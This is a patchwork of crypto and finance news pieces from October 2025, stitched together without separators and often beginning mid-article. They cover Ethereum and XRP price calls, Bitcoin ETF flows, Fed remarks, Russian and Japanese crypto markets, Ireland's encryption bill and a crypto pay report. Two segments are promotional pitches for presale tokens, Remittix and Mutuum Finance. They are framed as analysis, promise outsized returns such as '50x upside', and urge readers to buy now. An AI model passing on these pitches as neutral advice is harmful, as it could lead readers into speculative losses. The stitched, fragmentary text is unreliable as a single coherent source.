Lee is once again in the spotlight for his endorsement of a set of predictions made by Mark Newton, Fundstrat’s technical analyst and a self-described “crypto savant” famous for his precise chart-based forecasts that have allowed him to accurately catch several ETH bottoms and rallies this year. Lee shared some of those predictions on his profile recently as if to reassure any traders worrying that ETH may have topped. “I do not make much of Crypto weakness in recent days, and expect $ETHUSD likely bottoms out over the next 1-2 days before heading back higher and rallies to $5500,” he posted, quoting the analyst he described as a “crypto savant.” “Following a recent strong technical rally from 9/25 into 10/7 in ETHUSD, there’s been a minor three-wave pullback, which is expected to likely end by 10/11 and turn back higher.” Crypto savant @MarkNewtonCMT at it again: ""I do not make much of Crypto weakness in recent days, and expect $ETHUSD likely bottoms out over the next 1-2 days before heading back higher and rallies to $5500. – Following a recent strong technical rally from 9/25 into 10/7 in… pic.twitter.com/LCQDtGpDXs — Thomas (Tom) Lee (not drummer) FSInsight.com (@fundstrat) October 9, 2025 Tom Lee backs bullish Ethereum analysis Mark Newton noted that ETHUSD has already done a 50% correction of the recent rally from 9/25, but is still expected to potentially hit $4,200-$4,220, an area that is supposed to be an optimal zone of support before ETH’s next leg up. However, other analysts believe it could take some more weeks before the bull market support band catches up. The token has already broken all-time highs above $5,000 in August, which has been its best month of 2025 so far. Even if choppy action persists for a while longer, nobody thinks reclaiming $5,000 is impossible, especially not Lee. In fact, Lee has repeatedly shared expectations for Ethereum in interviews, predicting it could reach $60,000 as an intermediate target by matching Bitcoin’s network value. He also expects that move to happen within the next five years, framing it as part of Ethereum’s longer-term supercycle driven by institutional adoption, tokenization of real-world assets, and staking by Wall Street firms. Tom Lee maintains conviction in Ethereum Tom Lee was a big fan of Bitcoin before many were and now that the world has woken up to BTC’s merits, he has pivoted to ETH where he expects to make even more money provided his wager pays off. Lee has been very bullish about Ethereum (ETH) throughout 2025, particularly through his role as chairman of BitMine Immersion Technologies. The company used to be focused on Bitcoin mining but has shifted focus to building the world’s largest corporate ETH treasury, aggressively accumulating over 2.4 million ETH since then. It aims for 5% of Ethereum’s total supply under what Lee calls the “Alchemy of 5%” which would position BitMine as a corporate parallel to Bitcoin treasuries like Michael Saylor’s Strategy. The company has now accumulated about 50% of the target, becoming the second-largest crypto treasury globally along the way with a total asset vault of $11.4 billion. Bitmine’s BMNR stock is up exponentially since its ETH treasury pivot. Source: Google Finance . Lee’s conviction is already being rewarded; his company stock jumped by 3,000% in the days after the ETH pivot announcement and it has gained clout as Ethereum’s Strategy. However, the real short-term win will be when ETH starts trading above $5,000, permanently. Get seen where it counts.

In the following lines, we will analyze their recent performances, outline some interesting predictions, and touch upon other interesting topics. XRP Resurgence Incoming? XRP’s valuation has plunged by 7% over the last seven days and currently trades at around $2.82 (per CoinGecko’s data). It is important to note that whales have sold 440 million tokens in the past month (equivalent to more than $1.2 billion), and that could have contributed to the negative performance. However, many analysts remain optimistic that the bull run is far from being over. X user CasiTrades, for instance, thinks a major breakout could be on the horizon, citing strong technical signals. She noted that the recent lows continue to hold the “significant support on the macro scale” at $2.79. Furthermore, she believes XRP has broken above a certain consolidation pattern. Having said that, the analyst argued that the macro targets of $8-$13 remain “entirely possible if momentum continues strong.” Ali Martinez chipped in, too. He envisioned a rebound to $3.10 if XRP finds support at $2.73. At the same time, some popular names, like the veteran trader Peter Brandt, are not so bullish. Just a few hours ago, he added the asset to his list of “short candidates,” noting that the downtrend could be in play if the price falls below $2.68. What About ETH? The second-largest cryptocurrency is also in red territory on a weekly scale, albeit posting less substantial loss than XRP. As of this writing, it trades at around $4,350, but some important indicators, such as the recent whale accumulation and shrinking reserves stored on exchanges, hint that “Uptober” may be highly beneficial. Analysts are also optimistic. X user ZYN spotted a so-called Wyckoff accumulation pattern of ETH’s weekly chart and set a target of $8,000 for Q4. However, the price must first register a weekly close above $4,750. Crypto Caesar shared a similar thesis, forecasting a major pump to as high as $10,000. He also claimed the rally has at least half a year left. Martinez was in the pessimists’ corner this time. He described the $4,000-$4,800 price range as a “danger zone” and suggested the price could plummet to $3,780 in the short term. Is SOL Ready for Something Big? Lastly, we will touch upon Solana’s native token, whose valuation hovers around $220, representing a 5% decline over the past week. According to Lark Davis (an X user with almost 1.5 million followers), the price has formed a typical “cup and handle” pattern on the monthly chart, which suggests an explosion to $425 could be on the way. He highlighted the potential approval of the first spot SOL ETF in the US as a main catalyst that could fuel the rally. Some of the prominent companies willing to introduce such a product include Grayscale and Canary Capital. The SEC’s decision deadline for Grayscale’s application is October 10, though it remains uncertain whether any announcement will be made today due to the ongoing shutdown of the American government.

After a sharp push and quick fade, traders are hunting asymmetric upside while the market resets. One Ethereum ecosystem play keeps coming up in private chats and analyst notes. It blends on-chain traction with real payment rails, and some desks now treat it as the best crypto to buy now for the 2025 cycle. The BTC price action reinforces that message. A clean reclaim of momentum could happen fast, but whipsaws are punishing late entries. That is why capital is rotating toward a particular utility token tied to Ethereum, where catalysts are stacked and execution is visible. Bitcoin: Uptrend Tested, Support Under Watch Bitcoin trades near $121,602 after a burst above $125,700 stalled. If the BTC price goes to $120,500, a deeper probe into the $118,000 to $120,000 area is on the table. Bulls are defending on-chain, and several models still map a path toward $140,000 by year’s end, conditional on macro support and steady inflows. Until confirmation, the BTC likely remains a trader’s market, not a passenger’s ride. Ethereum: Gas, Upgrades, and Institutional Interest Ethereum continues to anchor smart contracts and DeFi. ETH trades around $4,480, up about 8% week over week. Scalability work, faster L2s, and falling effective gas environments keep builders shipping. Institutions that want programmable money still start with Ethereum, and that is why the most promising new utility tokens tend to launch here. If network usage holds, Ethereum can keep pulling liquidity into the broader stack. Remittix: The Ethereum Token Tipped For 50x Upside There is a reason many analysts are whispering about one Ethereum token in particular. Remittix aims to move value from crypto to real bank accounts in more than 30 countries, with live FX conversion and a mobile-first wallet already in open beta. The current price is at $0.1130, with more than $27.2 million raised and over 676 million RTX sold. Listings are lined up on BitMart and LBANK, with another exchange path in motion. The security bar is high, with top tier verification and monitoring already completed. Why top analysts are circling Remittix: Direct crypto to bank payouts across 30 plus countries with real time FX. Independent security checks completed at the highest tier, with leadership boards placing it at the top of pre launch tokens. Confirmed routes onto centralized exchanges, including BitMart and LBANK. A live wallet beta that proves real users can move value today. Compared to legacy names, Remittix focuses on infrastructure that closes the gap between crypto wallets and traditional finance. In a market where BTC price swings can delay entries, an Ethereum utility token with visible delivery can capture the next wave first. Act Now: Giveaway, Referrals, and First-Mover Edge Momentum is accelerating. A $250,000 community giveaway is drawing new eyes, and the referral program pays 15% in USDT with daily claims inside the dashboard. Participation metrics keep climbing, and that is before full scale rollout. If you want exposure while the BTC price consolidates and Ethereum continues to attract serious capital, early positioning in RTX offers the kind of scarcity window that does not stay open for long.

Will Rate Cuts Continue? Two Fed Members Speak Out!,https://en.bitcoinsistemi.com/what-will-the-fed-do-without-key-economic-data-will-rate-cuts-continue-two-fed-members-speak-out/,"The US government shutdown has negatively impacted government agencies. As a result, government employees were furloughed, and the publication of key economic indicators, such as employment and Gross Domestic Product (GDP), was suspended. As uncertainty persists about how long the US lockdown will last, anxiety about the Fed's interest rate cuts has also increased. The Fed, which bases its interest rate decisions on released economic data, will be unable to provide much important economic data. Citibank economists said they expect the Fed to continue cutting interest rates for the rest of the year, despite the risk of missing out on important economic data due to the government shutdown. Related News: Has the Fed Reached a Dead End with the US Government Shutdown? Citibank Announces Whether Rate Cuts Will Continue! While there is very little time left for the FED's interest rate decision in October, statements have come from FED members. Accordingly, San Francisco Fed President Mary Daly first stated in her statement that monetary policies were restrictive and pointed to further interest rate cuts. Speaking at an event held at the Silicon Valley Executives Exchange, Daly said that the decision to cut interest rates last month was driven by the easing of the labor market and inflation, and that this decision signaled the possibility of further interest rate cuts by the Fed in the future. “The economy is slowing down a bit. Consumers are running out of any excess savings they might have and are facing a higher price level. There's also a restrictive monetary policy. The interest rate cuts we made were made to ensure risk management while bringing our inflation target and employment target into a more perfect balance. Following the September rate cut, policy remains moderately restrictive and the Fed is considering further cuts as part of its risk management. As a result, labor demand is weakening, necessitating interest rate cuts.” Apart from Mary Daly, New York Fed President John Williams also signaled in his statement that he would be happy to lower interest rates again. Speaking to the New York Times, John Williams signaled that the Fed will not hesitate to cut interest rates again despite concerns among some policymakers about rising inflation. “The risk of a further slowdown in the labor market is something I've been very focused on,” Williams said, adding that President Donald Trump's trade tariffs haven't put as much upward pressure on inflation as many observers expected, and he sees no signs of any additional increases ahead. “I think there's more downside risk to the labor market and employment, and this removes some of the upside risk to inflation,” Williams said, noting that he doesn't expect any additional inflation increases in the coming period. *This is not investment advice.

According to an estimate, coins in Russian wallets have reached dozens of billions of dollars in valuation, a clear indication of the growing popularity of decentralized digital money in an otherwise centralized system. Russian crypto users change Moscow’s crypto stance Around 20 million people in Russia regularly use cryptocurrency, members of the senior management of the country’s finance ministry and central bank have acknowledged . Quoted by the official TASS news agency on Thursday, Deputy Finance Minister Ivan Chebeskov, stated: “We recognize that crypto exists – that much is clear. It took some time to reach that understanding. We have millions of citizens, by some estimates 20 million, who use cryptocurrency for various purposes.” “Since they are already using it, we need our own infrastructure to protect citizens and to have both economic and technological benefits,” the high-ranking Minfin official conceded. The figure referenced by Chebeskov was confirmed by Vladimir Chistyukhin, first deputy chairman of the Central Bank of Russia (CBR), as per a report by leading Russian crypto news outlet Bits.media. Speaking at this week’s Finopolis 2025 forum, he agreed that approximately 20 million Russians currently use digital coins in their daily lives. According to data compiled by Russia’s monetary authority, the assets held by Russian residents in wallets on crypto exchanges reached 827 billion rubles (over $10 billion) at the end of March, an increase of 27% over the same period of 2024. The bulk of these holdings, at the end of the first quarter, were in Bitcoin (BTC), 62.1%, Ethereum (ETH), 22%, and the U.S.-dollar pegged stablecoins USDT and USDC, 15.9% combined. According to a top executive at Russia’s largest commercial bank, the majority state-owned Sber, Russians keep much more crypto in their pockets than what the CBR has found. “Cryptocurrencies are popular among Russians. According to our calculations, market figures confirm interest in crypto investment,” First Deputy Chairman of Sberbank’s Management Board Alexander Vedyakhin commented, quoted by TASS. During the same fintech conference, Vedyakhin stated: “The total digital assets held by individuals and companies can be estimated at at least $40 billion.” “The potential circle of cryptocurrency investors can be quite broad,” added the banker, whose institution was among the first to place crypto derivatives on the Russian market, after the CBR authorized their offering in May. Russia is ready to regulate cryptocurrency in 2026 Earlier this year, Russian authorities permitted the use of cryptocurrencies in foreign trade under Western sanctions and granted a narrow category of “ highly qualified ” investors access to the digital assets and their derivatives. But the country lacks a comprehensive regulatory framework, with the Bank of Russia, in particular, being reluctant to allow crypto operations beyond a strictly controlled “experimental legal regime.” The mood in Moscow has been changing, however, and last week, the regulator announced it will conduct a thorough survey of crypto investing and lending to companies in the sector in the first two months of 2026. And this week, its First Deputy Chairman Vladimir Chistyukhin unveiled that while maintaining its conservative stance on crypto, the CBR intends to, nevertheless, allow Russian banks to work with crypto assets, as reported by Cryptopolitan. Also at the Finopolis event, the deputy governor indicated the central bank expects Russian parliament to adopt legislation governing crypto investments as early as next year. He elaborated: “In terms of timeframes, we are very ambitious. We believe that the preliminary discussions have taken a considerable amount of time, and now we must strive to reach a final consensus and move forward.” According to TASS, Chistyukhin expressed hope that licensing will begin right after the passing of the law, so that the first licensed service providers can emerge by the end of the year. “And then, we would need at least another year to prepare all participants and to clean up the mess with those entities currently conducting crypto transactions,” he added. That should allow Russian lawmakers to introduce necessary changes to the country’s criminal and administrative codes by 2027, Chistyukhin explained.

The surge reflects renewed institutional interest in Bitcoin as the asset trades near record highs. The latest inflows pushed cumulative totals for U.S. Bitcoin spot ETFs to $62.77 billion, with total net assets reaching $164.79 billion and daily trading volume climbing to $5.32 billion. Bitcoin ETFs now represent roughly 6.8% of Bitcoin’s total market capitalization, showing their growing role in institutional portfolios. BlackRock Dominates Bitcoin ETF Market as Ethereum Products Lose Momentum US Spot Bitcoin ETFs, October 9 Source: SoSoValue BlackRock’s iShares Bitcoin Trust (IBIT) led the inflows with $255.47 million, extending its dominance in the sector with total assets surpassing $97 billion. Fidelity’s Wise Origin Bitcoin Fund (FBTC) saw $13.19 million in outflows, while Grayscale’s GBTC reported $45.55 million in withdrawals. The renewed momentum for Bitcoin ETFs follows a string of strong inflow sessions this month. Earlier in the week, Bitcoin ETFs logged $1.19 billion in inflows on October 6 , their highest daily total since July, with BlackRock accounting for more than 80% of that amount. US spot Bitcoin ETFs pulled in $3.24B last week, their second-biggest inflows since launch, as BTC hit fresh record highs and investor demand surged. #bitcoin #spotETF https://t.co/2d3W5NME0Y — Cryptonews.com (@cryptonews) October 6, 2025 Bitcoin (BTC) itself has risen over 10% in October, peaking at $126,080 before pulling back to around $121,000 at press time, down 0.6% in the past 24 hours. The growing inflows mark Bitcoin’s best month since the summer, with institutional investors driving demand as expectations of favorable regulatory developments and strong earnings season tailwinds build. In contrast, Ethereum ETFs saw their eight-day inflow streak end on October 9, recording $8.7 million in outflows. The reversal came after consistent gains over the past week, during which Ethereum ETFs attracted more than $1.8 billion in cumulative inflows. US Spot Ethereum ETFs, October 9 Source: SoSoValue Total assets for Ethereum spot ETFs now stand at $29.9 billion, with a total trading volume of $2.34 billion. BlackRock’s ETHA fund remained the top performer with $39.29 million in inflows, while Fidelity’s FETH led the outflows with $30.26 million. Other issuers, including Bitwise, VanEck, and 21Shares, also reported modest withdrawals. Ethereum was trading at $4,352 at the time of reporting, down 2.3% on the day and 3.2% over the past week. Despite the short-term pullback, Ethereum remains about 12% below its August peak of $4,946. Spot trading volumes for Ethereum stayed firm at $40.4 billion over the past 24 hours, a 9% rise from the previous day, while futures activity climbed 21.5% to $93.6 billion, suggesting continued trader engagement despite the pause in ETF inflows. Bitcoin, Ethereum See Record Institutional Momentum as ETFs and Treasuries Expand Bitcoin and Ethereum continued to show strong institutional momentum this year, driven by record ETF inflows and on-chain signals suggesting more upside ahead. Bitcoin, which recently traded around $121,000, remains “ice cold” by one of its key valuation gauges, the Mayer Multiple. The indicator, which compares price to Bitcoin’s 200-week moving average, currently sits at 1.16, well below the 2.4 level typically viewed as overheated. Analysts say that leaves room for prices to climb toward $180,000 before reaching historically “overbought” conditions. Despite sitting at all-time highs, on-chain metrics indicate a calmer and more sustained market than in past cycles. Meanwhile, BlackRock’s iShares Bitcoin Trust (IBIT) has become the firm’s most profitable exchange-traded fund, earning roughly $245 million in fees over the past year. The spot Bitcoin ETF has amassed nearly $98 billion in assets since its launch 22 months ago, making it the fastest-growing ETF in history and positioning it to surpass Vanguard’s S&P 500 index fund (VOO) as the first to hit the $100 billion mark. Institutional interest has also expanded to Ethereum. Treasury holdings and spot ETFs now collectively hold more than 12.4 million ETH, or about 10% of the total supply. Treasury allocations account for 5.6 million ETH, while ETFs hold another 6.8 million ETH, showing Ethereum’s rising status as a mainstream institutional asset alongside Bitcoin.

Key Takeaways: The Global Encryption Coalition urged Ireland to drop a proposed law granting police access to encrypted messages. The bill would force messaging platforms to provide authorities access to encrypted data. The coalition warned that major tech firms could leave Ireland rather than weaken encryption. In an open letter published Thursday , Ryan Polk of the Global Encryption Coalition (GEC) urged Dublin to halt development of the Communications, Interception and Lawful Access Bill, proposed by Minister for Justice Jim O’Callaghan. Privacy Coalition Warns Ireland’s Encryption Bill Would Weaken Security The coalition, which represents organizations advocating for secure digital privacy worldwide, said the legislation would effectively weaken encryption for all users, not just suspected criminals. “Any country that undermines encryption risks threatening the privacy and security of people far beyond its borders,” Polk wrote. “But Ireland, as host to the EU headquarters of major tech companies including Apple and Meta, bears particular responsibility.” The bill, still in pre-draft form, is expected to move forward in the coming months. If passed, it would require messaging platforms to provide access to encrypted data for Irish authorities. Polk argued such a move would make individuals and businesses more vulnerable to hacking, fraud, and espionage. We've just fought #ChatControl – now Ireland wants its own backdoor law. But we, together with ~40 orgs, are saying no. #NoToBackdoors Read our open letter to Ireland: https://t.co/NGudPUADpB #backdoor #encryption #privacy #security pic.twitter.com/plnqo9RJgT — Tuta (@TutaPrivacy) October 9, 2025 “Encryption is a critical security feature; any deliberate weakening or circumvention of it creates systemic vulnerabilities that would endanger everyone and put Ireland’s national security at risk,” he added. Ireland’s thriving tech sector, which houses the European headquarters of major companies, could also be hit. The GEC warned that firms offering end-to-end encrypted services may be forced to either compromise their users’ security or exit the Irish market entirely. “In both cases, the result would be weaker security and reduced privacy for Irish citizens, businesses, and institutions,” Polk wrote. Link to Controversial EU ‘Chat Control’ Law The call comes amid growing resistance to similar proposals in the European Union . Earlier this week, Germany’s government opposed the controversial Chat Control bill, which seeks to allow message scanning before encryption, dealing it a serious setback. The GEC has urged Ireland to also withdraw support for the EU proposal, arguing that both measures would set dangerous precedents. As Ireland prepares to assume the EU Council presidency in July 2026, Polk said the country has “a unique opportunity to champion strong encryption and digital safety rather than undermine it.” “The privacy and security of all European citizens, and beyond, will be at risk if Ireland proceeds,” he warned. Meanwhile, the Ethereum Foundation has announced the launch of a 47-member Privacy Cluster coordinated by Blockscout founder, Igor Barinov. The initiative expands on efforts dating back to 2018 through the Privacy and Scaling Explorations team , which has built over 50 open-source research projects and released key primitives, including Semaphore for anonymous signaling, MACI for private voting, and zkEmail.

That said, the Near Protocol (NEAR) price spiked as much as 9.3% on Friday morning, while Chainlink (LINK) is back in the breakout zone. $NEAR price spike takes it to resistance and possible breakout Source: TradingView A big price spike from $NEAR has put this crypto up against horizontal resistance and close to the descending trendline. However, the Stochastic RSI indicators are starting to top out, while volume would need to increase if a successful breakout is to occur. Horizontal resistance is key for $NEAR bulls Source: TradingView The weekly time frame for the $NEAR price reveals that it is very much an open and shut case. The strong horizontal resistance level at $3.13 is key to everything. If the bulls can break through this and confirm above, then the last stage of the crypto bull market is very much on for $NEAR. A W pattern may still be in formation, with the neckline at the horizontal resistance level. At the bottom of the chart, the Stochastic RSI indicators are going to need to turn back around. If they can do this, it could provide the momentum for the breakout. Breakout not quite yet for $LINK? Source: TradingView The short-term time frame for $LINK shows that the price is right up against the top trendline of the channel again. However, just as is the case for $NEAR, the Stochastic RSI indicators are showing signs of topping out soon, while the volume profile is still decreasing. This is not exhibiting the confidence for a breakout. It might be more likely that the price is rejected from the trendline once again. This would allow the momentum to reset before another, perhaps more successful attempt at a breakout. $LINK bull flag breakout as soon as next week Source: TradingView In the weekly time frame things look very interesting for the $LINK price . A big rise from June until August 2025 ended with a long sideways and downwards consolidation phase, which looks very much like a bull flag. Given that the $LINK price is right up against that top trendline, and that there are only a couple of days left in the week, a breakout for next week is quite likely. Look for the Stochastic RSI indicators to start turning sideways and then up at the 50.00 level. Also, the volume bars would start to increase in size. One major factor to take into account when backing either $NEAR or $LINK is the status of $BTC. These altcoins are only going to breakout if $BTC leads. Keep a very close eye on the $BTC price over the rest of this week. Disclaimer: This article is provided for informational purposes only.

Its repertoire of lightning-fast transactions, minimal fees, and tokenization applications in the real world is drawing institutional capital and developers at an accelerating rate. As Solana establishes itself as a platform for next-gen decentralized applications, investor sentiment is expanding beyond established Layer-1s to up-and-coming players in the DeFi market, and Mutuum Finance (MUTM) is becoming one of the most interesting. Available during Phase 6 of presale, Mutuum Finance is priced at around $0.035 and has already offloaded more than 60% of the tokens. Over $17.05 million has been raised from more than 16,820 investors. Mutuum Finance stands out in prioritizing real utility over speculation, building a two-layer DeFi stack that combines collateralized lending, yield optimization, and decentralized credit markets to address the core inefficiencies of old finance. Mutuum Finance can outdo even the strongest Layer-1 titans in the long run. Solana Surpasses Ethereum’s Initial Growth With Historic $2.85 Billion Annual Revenue Solana (SOL) has solidly entrenched itself as one of the most lucrative and fast-growing blockchain networks, bringing in a staggering $2.85 billion in revenue over the last year, as reported by 21Shares. Motivated by activity on the trading platform, which accounted for 39%, $1.12 billion, of that figure, Solana’s network remains well-performing across verticals of DeFi, memecoins, AI applications, decentralized exchanges, and launchpads. After the January memecoin high at $616 million revenue, subsequent to the memecoin bubble, monthly revenues remained firm at $150 million to $250 million, indicating sustainable demand for the network. With 1.2–1.5 million active addresses daily, almost three times Ethereum’s during a similar phase, Solana is clearly winning the Layer-1 battle. And yet, though fundamentals for it are being established, investors are looking towards newer project Mutuum Finance. Mutuum Finance Presale Goes Soars Mutuum Finance is shaking the DeFi market with its presale, supported by more than 16,830 investors, and already raising more than $17.05 million. MUTM tokens are available during Phase 6, which is already sold out by 60%, priced at $0.035 per token. As a gesture of gratitude to the pioneer investors, the team has organized a $100,000 giveaway in which 10 people will receive $10,000 each in MUTM tokens. Mutuum Finance is launching a USD-backed stablecoin on the Ethereum blockchain. Unlike algorithmic stablecoins that have been destroyed during bear markets, the new token will be non-algorithmic and overcollateralized in design to ensure price stability during bear markets. Mutuum Finance Announces Lending & Borrowing Protocol Mutuum Finance will launch its lending and borrowing protocol . V1 will launch on the Sepolia Testnet in Q4 2025 with liquidity pool, mtToken, debt token, liquidator bot, and other major functionality. ETH and USDT are supported on day one for collateralization, lending, and borrowing, giving customers a secure, stable, and easy-to-use DeFi experience. The protocol employs a risk-adjusted Loan-to-Value (LTV) process in which the maximum collateral of all assets is determined through its risk category to facilitate proportionate and secured lending. Buffer reserve system is also a protective mechanism where assets with higher risk will have to keep larger reserves, safeguarding users from market volatility while enabling ecosystem stability. DeFi Momentum Shifts Solana’s $2.85 billion revenue proves strong demand for scalable blockchain solutions. At the same time, Mutuum Finance is gaining rapid traction, raising over $17.05 million from 16,830+ investors with more than 60% of presale phase 6 tokens sold at $0.035. Its focus on real utility and stable DeFi solutions positions it for long-term growth. Act now, secure your MUTM tokens before Phase 6 sells out and be part of DeFi’s next big chapter.

The credit rating firm now expects new home sales to drop 8% compared to last year, landing somewhere between $1.23 trillion (8.8 trillion yuan) to $1.26 trillion (9 trillion yuan). This marks a significant shift from the firm’s earlier forecast in May, when analysts had predicted only a 3% decline. Back then, experts thought that trade tensions and other external pressures would force Chinese authorities to roll out larger programs to prop up the housing sector , explained Edward Chan of S&P Global Ratings, in comments to CNBC. The primary factor behind the darker outlook is simple: buyers remain nervous about purchasing homes. “So the government will need to continue to support the sector and demand to help restore homebuyers’ confidence,” Chan stated . Last September, Chinese leaders held an important meeting where they pledged to stop the real estate slide. However, after introducing several new policies last year, political energy behind additional support measures seems to have weakened. China’s property market weakens as policy easing slows S&P pointed out that China’s five-year loan prime rate , which serves as the reference point for most home loans, has only dropped by 0.1% in 2025 so far. That compares to a much larger 0.6% cut throughout 2024, suggesting authorities aren’t loosening policy as forcefully as they did before, even with the housing sector still struggling. Last August, three of the country’s biggest cities relaxed rules that had limited how many properties people could own. But these changes mainly affected homes in less attractive outer areas of cities, according to S&P’s analysis. “If demand can be stabilized first in the higher-tier cities, particularly in the first-tier [largest] cities first, that would probably help the trajectory of the demand recovery to be more sustainable,” Chan noted. The prospect of hitting bottom in China’s housing crisis now appears further away than before. At the current projection of 9 trillion yuan or below for this year, China’s property market will have shrunk by half within four years, down from 18.2 trillion yuan back in 2021, S&P’s figures show. The firm anticipates an additional 6% to 7% drop next year, with home prices in the primary market falling 1.5% to 2.5%. Government support fails to lift weak housing demand For many years, Chinese homebuyers typically purchased apartments before construction finished. When developers hit money troubles and building work stalled, buyer confidence took a hit. This led authorities to create a “whitelist” last year to provide funding for approved unfinished developments. By August, unsold housing stock rose to 762 million square meters, from 753 million square meters in December 2024, according to S&P data. Chan said the government has been working hard to assure people that receiving their apartments is no longer a problem. He explained that the real issue is overall demand across the country appears weaker than anticipated. Looking ahead, Chan believes authorities will continue stepping in with support measures, even if gradually, whenever the market shows signs of weakness. Last August brought both the easing of some purchase restrictions and a notable public statement from Chinese Premier Li Qiang acknowledging the ongoing real estate problems and the need for greater action. The month after that, sales among China’s top 100 developers increased 0.4% compared to the same period a year earlier, S&P reported, citing industry figures. While developers fight to stay afloat, the report suggested that “the result may be a smaller market, but also a healthier and more resilient sector.” Want your project in front of crypto’s top minds?

We’re Still In a Bull Run,https://timestabloid.com/egrag-crypto-to-xrp-investors-dont-panic-were-still-in-a-bull-run/,"In a recent post on X, Crypto analyst Egrag Crypto released a new technical update focused on XRP’s long-term trajectory, addressing growing concern from those reacting to the current pullback. Rather than engaging with short-term market sentiment, his message was built around key price levels and historical cycle structure, reinforced through a detailed multi-year chart. Historical Cycles and Long-Term Outlook The chart Egrag Crypto shared highlights XRP’s progress through three major market cycles: 2013, 2018, and the developing 2025 phase. Each cycle is mapped along parabolic arcs, indicating a pattern of accumulation followed by breakout peaks. The upper trajectory projected for the 2025 cycle is a sign that XRP’s macro trend is intact and advancing within its expected range. Egrag’s analysis positions current price action not as deviation, but as a continuation of established behavior. The recurring market cycles suggest that XRP remains on course toward a higher range if it respects critical structural levels. #XRP – Super #Bullish ! Alright, I’ve been flooded with DMs from weak hands crying about this dip. So go ahead, fill the comments with your crying as well. #XRP isn’t for those who can’t handle math, numbers, and logic. From day one in the #XRPCommunity , I’ve encountered… pic.twitter.com/VOpzzK6rr4 — EGRAG CRYPTO (@egragcrypto) October 9, 2025 Critical Support at $2.77 and Technical Conditions A central point in Egrag Crypto’s update is the $2.77 level on the two-month chart. According to his criteria, maintaining closes above this figure keeps XRP within its bullish formation. A highlighted zone between $2.77 and $3.65 represents the pivotal region to monitor before any larger move. We are on X, follow us to connect with us :- @TimesTabloid1 — TimesTabloid (@TimesTabloid1) June 15, 2025 The analyst made it clear that his strategy will remain unchanged unless XRP closes below the yellow trend marker on this time frame. Should that line turn red, he indicated he would preserve gains, treating it as a technical break rather than an emotional decision. Community and Market Discipline Egrag reiterated that XRP’s current phase requires conviction grounded in data, not reaction to temporary dips. His comments were aimed at separating long-term strategy from short-term uncertainty. He maintained confidence that the bull run remains in progress and that expectations for a future all-time high remain valid under current conditions. Egrag Crypto’s analysis mainly focuses on structure, not sentiment. With $2.77 identified as the defining threshold for XRP’s immediate path, his outlook remains aligned with continuation into the 2025 cycle. The broader trend, supported by historical arc patterns, remains active, with key technical criteria guiding any adjustment in stance.

The report displayed that crypto payments have declined across the board this year, despite the Bitcoin price reaching an all-time high of over $126,000. According to the Dragonfly report, the average compensation reduced for most seniority levels. The report categorized data from 85 companies and over 3,000 roles. Dragonfly noted a “barbell effect” where executive pay saw modest increases while the majority of employees faced reduced pay and token incentives. The report confirmed that the industry’s overall trend toward stability and long-term risk management is reflected in this change. Crypto compensation declines amid shifting global pay dynamics The definitive 24/25 crypto comp benchmarks 👇 * 85 companies & 3.4k+ candidate data points * Splits by size/stage/funding/type/geo * YoY industry trends and data What’s inside (1/3): — Salary/equity/token ranges + benchmarking tool — Founder compensation … pic.twitter.com/WefWbmy6mt — Zackary Skelly (@zorkary) October 9, 2025 Dragonfly’s report revealed that the cryptocurrency compensation market is in decline and that pay practices are still immature when compared to more established industries. The capital firm mentioned that hiring slowed with an average of 3.8 weeks and four interview rounds per business. The report also revealed that offer acceptance rates ranged around 68%, often due to concerns about pay. U.S. companies led in cash compensation, while international teams closed the gap with greater stock and token packages. According to the report, equity changed unevenly, particularly for non-executive and non-technical positions. International cases occasionally reached 2–10× U.S. levels, whereas the U.S. observed declining ranges (compression). International PM equity ranged from 2 to 10 times U.S. levels, while product management executives reported the highest salaries, ranging from $390,000 to $484,000, matching or surpassing engineering in total compensation. Dragonfly’s report acknowledged that developer relations became the most “borderless” function, with near-identical global compensation bands and small deltas at the CEO level (internationally led tokens versus U.S.-led equity/total compensation). The capital firm stated that developer relations emerged as the most “borderless” function. The report showed that engineering roles comprise approximately two-thirds of the crypto workforce. According to the report, the engineering sector experienced changes, including international engineering executives earning more than their U.S. counterparts, with total compensation ranging from $530,000 to $780,000. Token packages drove the earnings up to 3%. The global crypto investment firm also reported that later-stage firms looked to Eastern Europe, where 63% of companies hired cost-effective engineering talent. Dragonfly also accounted that engineering roles accounted for 67% of the total crypto headcount across company sizes and funding tiers. Only 10% of jobs were entry-level, and the combined percentage of product and marketing teams was still low at less than 20%. Remote work reshapes global hiring and compensation. The remote work statistics display that only 2% of companies maintain traditional in-office setups. Blockchain-focused investment firm added that more than half of all companies operate entirely remotely. Hybrid models combined limited in-office requirements with remote flexibility. The report displayed a 54% remote acceptance rate among smaller teams with 1 to 5 workers and an 83% rate among larger companies with more than 100 employees. Among the surveyed crypto companies, remote work also became more common by the Series B round, with 73% of teams operating entirely remotely. Dragonfly’ s report confirmed that 94% of enterprises have no plans to change their work policies. The lack of change in work policies showed a long-term shift away from reliance on offices. International teams preferred hybrid structures at 35%, while U.S. enterprises tended to be more remote at 55%. In Western Europe, 84% of companies between Series B and E employed staff in the region. According to the Dragonfly report, Canada drew 38% of Series B-E firms as a geographic and regulatory hedge. Asia’s participation nearly quadrupled year-on-year, increasing from 20% to 41%. Outliers, including Africa, showed a 4% growth, Oceania displayed 2%, and India revealed 9%, as well as South America at 13%, all of which showed relatively modest growth.

The crypto market in Japan is entering a new phase of mainstream adoption after PayPay, the SoftBank and Yahoo Japan-backed payments giant, took a 40 percent stake in Binance Japan to link cryptocurrency with mainstream digital payments. Japan’s crypto ecosystem is evolving into a two-track system with regulated, institution-backed innovation led by big name companies and gray-zone activities of unregistered crypto exchanges operating in Japan as well as other emerging crypto-related crimes. Japan embraces cryptocurrency The Binance Japan deal is expected to intensify competition for new crypto users in Japan. In 2023, major Japanese e-commerce marketplace, Mercari, launched its own crypto exchange platform named Mercoin, which surpassed one million users in seven months and currently boasts more than three million users. The vast majority are first time crypto traders. The public’s enthusiastic reception of Mercoin caught the company by surprise. “The growth has been extremely fast – well beyond our expectations,” Mercoin’s representative Tamotsu Kobayashi said in an interview with Cryptopolitan. He said the perception of cryptocurrency is changing in Japan, moving from an image associated with being “scary” and “complicated” to one that is increasingly “familiar” and “accessible.” The shift also involves moving past the idea that high initial funding is needed. So Saito, a Japan-based lawyer specializing in fintech, believes Japan’s crypto asset market has matured, evident with an increase in users and trading volume. But, despite official data showing more than 12 million crypto trading accounts have been opened in Japan, most holdings are small, with over 80 percent of individual accounts containing less than $675. Saito said following the major electronic retailer Bic Camera’s introduction of Bitcoin payments in 2017, public interest in crypto shifted from payments 